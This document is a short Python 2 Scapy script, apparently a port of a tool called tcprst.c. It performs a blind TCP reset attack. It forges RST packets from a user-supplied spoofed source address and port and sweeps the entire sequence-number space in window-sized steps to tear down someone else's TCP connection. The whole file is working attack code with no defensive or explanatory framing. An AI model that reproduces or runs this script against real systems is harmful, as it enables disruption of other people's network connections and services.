# this script is the python/scapy equivalent of tcprst.c

from optparse import OptionParser
from scapy.all import *
conf.L3socket = L3RawSocket

parser = OptionParser()
parser.add_option("-D", dest="dst_addr", help="Destination address")
parser.add_option("-d", dest="dst_port", help="Destination port")
parser.add_option("-S", dest="src_addr", help="Source address")
parser.add_option("-s", dest="src_port", help="Source port")
parser.add_option("-w", dest="wnd_size", default=16384, help="Window size")

(options, args) = parser.parse_args()
if options.src_port is None or options.src_addr is None or options.dst_addr is None or options.dst_port is None:
    parser.print_help()
    exit()

print "%s:%s -> %s:%s (win=%s)" % (options.src_addr, options.src_port, options.dst_addr, options.dst_port, options.wnd_size)

def chunks(lst, n):
    "Yield successive n-sized chunks from lst"
    for i in xrange(0, len(lst), n):
        yield lst[i:i+n]

UINT_MAX = 4294967295L

packet = IP(src=options.src_addr, dst=options.dst_addr)/TCP(sport=int(options.src_port), dport=int(options.dst_port), flags="R", window=options.wnd_size)

seqs = range(options.wnd_size, UINT_MAX-options.wnd_size, options.wnd_size)
for chunk in chunks(seqs, 8192):
    print '>',
    packet.seq = chunk
    send(packet, verbose=0)
    print '<'

print 'done'